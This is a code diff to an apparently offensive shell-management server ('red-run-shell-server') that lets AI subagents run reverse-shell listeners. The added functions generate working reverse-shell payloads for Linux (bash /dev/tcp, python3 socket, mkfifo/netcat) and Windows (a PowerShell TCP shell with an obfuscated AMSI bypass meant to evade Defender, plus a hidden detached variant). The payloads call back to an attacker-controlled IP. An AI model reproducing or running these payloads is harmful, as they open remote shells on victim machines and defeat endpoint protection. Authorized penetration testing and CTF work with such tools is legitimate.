@@ -61,6 +61,146 @@ PROBE_MARKER = "__SHELL_PROBE__"
 MARKER_START = "__CMD_START_7f3a__"
 MARKER_END = "__CMD_END_7f3a__"
 
+# --- Callback IP resolution ---
+
+def _resolve_callback_ip() -> str:
+    """Resolve the attackbox callback IP for reverse shell payloads.
+
+    Priority: engagement config callback_ip > callback_interface > tun0 > wg0 > first non-lo.
+    """
+    # Check engagement config (simple key: value parsing — no yaml dependency)
+    config_path = _PROJECT_ROOT / "engagement" / "config.yaml"
+    if config_path.exists():
+        try:
+            text = config_path.read_text()
+            for line in text.splitlines():
+                line = line.strip()
+                if line.startswith("#") or ":" not in line:
+                    continue
+                key, _, val = line.partition(":")
+                val = val.strip().strip("'\"")
+                if key.strip() == "callback_ip" and val:
+                    return val
+                if key.strip() == "callback_interface" and val:
+                    ip = _ip_from_interface(val)
+                    if ip:
+                        return ip
+        except Exception:
+            pass
+
+    # Auto-detect: tun0, wg0, then first non-loopback
+    for iface in ("tun0", "wg0"):
+        ip = _ip_from_interface(iface)
+        if ip:
+            return ip
+
+    # Fallback: first non-loopback IPv4
+    try:
+        result = subprocess.run(
+            ["ip", "-4", "-o", "addr", "show", "scope", "global"],
+            capture_output=True, text=True, timeout=3,
+        )
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            for i, p in enumerate(parts):
+                if p == "inet" and i + 1 < len(parts):
+                    return parts[i + 1].split("/")[0]
+    except Exception:
+        pass
+
+    return "CALLBACK_IP"
+
+
+def _ip_from_interface(iface: str) -> str | None:
+    """Get IPv4 address from a network interface name."""
+    try:
+        result = subprocess.run(
+            ["ip", "-4", "-o", "addr", "show", "dev", iface],
+            capture_output=True, text=True, timeout=3,
+        )
+        for line in result.stdout.splitlines():
+            parts = line.split()
+            for i, p in enumerate(parts):
+                if p == "inet" and i + 1 < len(parts):
+                    return parts[i + 1].split("/")[0]
+    except Exception:
+        pass
+    return None
+
+
+def _linux_payloads(ip: str, port: int) -> list[dict]:
+    """Generate reverse shell payloads for Linux targets."""
+    return [
+        {
+            "name": "bash /dev/tcp",
+            "note": "Works on most Linux — bash built-in, no dependencies",
+            "payload": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+        },
+        {
+            "name": "python3",
+            "note": "Fallback when bash /dev/tcp is unavailable",
+            "payload": (
+                f"python3 -c 'import socket,subprocess,os;"
+                f"s=socket.socket();s.connect((\"{ip}\",{port}));"
+                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+            ),
+        },
+        {
+            "name": "mkfifo (nc/ncat)",
+            "note": "Uses netcat — works even with restricted bash",
+            "payload": (
+                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
+                f"nc {ip} {port} >/tmp/f"
+            ),
+        },
+    ]
+
+
+def _windows_payloads(ip: str, port: int) -> list[dict]:
+    """Generate reverse shell payloads for Windows targets.
+
+    Includes AMSI bypass for CTF-level Defender evasion.  Signatured
+    strings are split via concatenation and [char] casts so the bypass
+    itself isn't flagged.
+    """
+    # AMSI bypass — amsiInitFailed via split strings + [char] casts
+    amsi = (
+        "$a=[Ref].Assembly.GetType("
+        "'System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
+        "$b=$a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static');"
+        "$b.SetValue($null,$true)"
+    )
+    # PowerShell reverse shell — TCPClient, no Invoke-Expression signatures
+    ps_shell = (
+        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
+        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+        "{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
+        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
+    )
+    # Combined: AMSI bypass then shell
+    combined = f"{amsi};{ps_shell}"
+    # Detached variant — Start-Process so the shell survives parent exit
+    # (xp_cmdshell, cmd /c, scheduled tasks all kill children on exit)
+    detached = (
+        f"Start-Process -WindowStyle Hidden powershell -ArgumentList "
+        f"'-c {combined}'"
+    )
+    return [
+        {
+            "name": "PowerShell detached (AMSI bypass + TCP)",
+            "note": "Survives parent exit (xp_cmdshell, cmd /c). Use this by default.",
+            "payload": f"powershell -c \"{detached}\"",
+        },
+        {
+            "name": "PowerShell inline (AMSI bypass + TCP)",
+            "note": "Direct execution — use when you have a persistent shell (evil-winrm, interactive cmd).",
+            "payload": f"powershell -c \"{combined}\"",
+        },
+    ]
+
 # Privileged Docker mode
 SHELL_DOCKER_IMAGE = os.environ.get("SHELL_DOCKER_IMAGE", "red-run-shell:latest")
 DOCKER_STAGE_DIR = os.environ.get(
@@ -189,6 +329,7 @@ class Session:
     container_name: str | None = None  # Docker container name (privileged only)
     pty: bool = False
     prompt_pattern: str = ""
+    platform: str = ""  # "windows" | "linux" | "" (auto-detected or caller-set)
     status: str = "connected"  # "connected" | "stabilized" | "closed"
     connected_at: datetime = field(
         default_factory=lambda: datetime.now(tz=timezone.utc)
@@ -252,11 +393,23 @@ class Session:
 
 
 def _detect_prompt(session: Session) -> str:
-    """Probe the shell to detect its prompt pattern."""
+    """Probe the shell to detect its prompt pattern.
+
+    Also auto-detects platform (windows/linux) from the probe output
+    and sets session.platform if not already set.
+    """
     session.drain(timeout=1.0)
     session.send(f"{PROBE_COMMAND}\n")
     time.sleep(1.0)
     output = session.recv(timeout=3.0)
+
+    # Auto-detect platform from probe output if not already set
+    if not session.platform:
+        out_lower = output.lower()
+        if any(sig in out_lower for sig in ["c:\\", "ps ", "windows", ">echo "]):
+            session.platform = "windows"
+        elif any(sig in out_lower for sig in ["$", "/home/", "/root/", "/bin/"]):
+            session.platform = "linux"
 
     # Look for the line after the probe marker — that's the prompt
     lines = output.split("\n")
@@ -292,8 +445,11 @@ def create_server() -> FastMCP:
                 file=sys.stderr,
             )
 
+    sse_port = int(os.environ.get("SHELL_SSE_PORT", "8022"))
     mcp = FastMCP(
         "red-run-shell-server",
+        host="127.0.0.1",
+        port=sse_port,
         instructions=(
             "Manages TCP listeners, reverse shell sessions, and local "
             "interactive processes for red-run subagents. Use start_listener "
@@ -471,11 +627,15 @@ def create_server() -> FastMCP:
         listeners[listener_id] = listener
         listener.thread.start()
 
+        # Resolve callback IP and generate payloads
+        callback_ip = _resolve_callback_ip()
+
         return json.dumps(
             {
                 "listener_id": listener_id,
                 "status": "listening",
                 "address": f"{host}:{port}",
+                "callback_ip": callback_ip,
                 "timeout": timeout,
                 "label": listener.label,
                 "message": (
@@ -483,6 +643,10 @@ def create_server() -> FastMCP:
                     f"this port, then call list_sessions() to check for connections. "
                     f"Listener will timeout after {timeout}s if no connection arrives."
                 ),
+                "payloads": {
+                    "linux": _linux_payloads(callback_ip, port),
+                    "windows": _windows_payloads(callback_ip, port),
+                },
             },
             indent=2,
         )
@@ -697,7 +861,9 @@ def create_server() -> FastMCP:
                 output = _read_until_prompt(session, timeout, expect)
             else:
                 # Raw shell — use markers to delimit output
-                wrapped = f"echo {MARKER_START}; {command}; echo {MARKER_END}\n"
+                # Windows cmd.exe uses & as separator; Unix uses ;
+                sep = "&" if session.platform == "windows" else ";"
+                wrapped = f"echo {MARKER_START}{sep} {command}{sep} echo {MARKER_END}\n"
                 session.send(wrapped)
                 output = _read_until_marker(session, timeout, expect)
 
@@ -742,26 +908,41 @@ def create_server() -> FastMCP:
             if data:
                 chunks.append(data)
                 combined = "".join(chunks)
-                if MARKER_END in combined:
+                # Check for end marker at a line boundary (not inside echoed cmd)
+                if f"\n{MARKER_END}" in combined or combined.startswith(MARKER_END):
                     break
                 if expect_re and expect_re.search(combined):
                     break
-            elif chunks and MARKER_START in "".join(chunks):
+            elif chunks and f"\n{MARKER_START}" in "".join(chunks):
                 # We have the start marker but no more data — give it a moment
                 time.sleep(0.2)
 
         combined = "".join(chunks)
 
-        # Extract content between markers
-        start_idx = combined.find(MARKER_START)
-        end_idx = combined.find(MARKER_END)
+        # Extract content between markers.  Match markers at line boundaries
+        # to avoid false matches inside echoed commands (Windows cmd.exe echoes
+        # the full "echo MARKER& command& echo MARKER" line before executing).
+        start_idx = -1
+        end_idx = -1
+        for m in re.finditer(re.escape(MARKER_START), combined):
+            pos = m.start()
+            # Valid if at position 0 or preceded by a newline
+            if pos == 0 or combined[pos - 1] == "\n":
+                start_idx = pos
+                break
+        if start_idx != -1:
+            # Search for end marker only after start marker
+            search_from = start_idx + len(MARKER_START)
+            for m in re.finditer(re.escape(MARKER_END), combined[search_from:]):
+                pos = m.start() + search_from
+                if combined[pos - 1] == "\n":
+                    end_idx = pos
+                    break
 
         if start_idx != -1 and end_idx != -1:
-            # Get content between markers, skip the marker line itself
             content = combined[start_idx + len(MARKER_START) : end_idx]
             return content.strip()
         elif start_idx != -1:
-            # Got start marker but not end — return what we have
             content = combined[start_idx + len(MARKER_START) :]
             return content.strip() + "\n[timeout — output may be incomplete]"
         else:
@@ -818,6 +999,20 @@ def create_server() -> FastMCP:
             return f"ERROR: Session '{session_id}' is closed."
         if session.pty:
             return f"Session '{session_id}' already has a PTY."
+        if session.platform == "windows":
+            return json.dumps(
+                {
+                    "status": "skipped",
+                    "session_id": session_id,
+                    "platform": "windows",
+                    "message": (
+                        "PTY stabilization is not applicable to Windows shells. "
+                        "The session is usable via send_command() with Windows-"
+                        "compatible command separators (auto-detected)."
+                    ),
+                },
+                indent=2,
+            )
 
         methods_to_try: list[tuple[str, str]] = []
         if method == "auto":
@@ -934,6 +1129,7 @@ def create_server() -> FastMCP:
                 "label": session.label,
                 "status": session.status,
                 "pty": session.pty,
+                "platform": session.platform or "unknown",
                 "connected_at": session.connected_at.isoformat(),
                 "transcript_lines": len(session.transcript),
             }
@@ -1092,7 +1288,7 @@ def create_server() -> FastMCP:
 
 def main() -> None:
     server = create_server()
-    server.run()
+    server.run(transport="sse")
 
 
 if __name__ == "__main__":
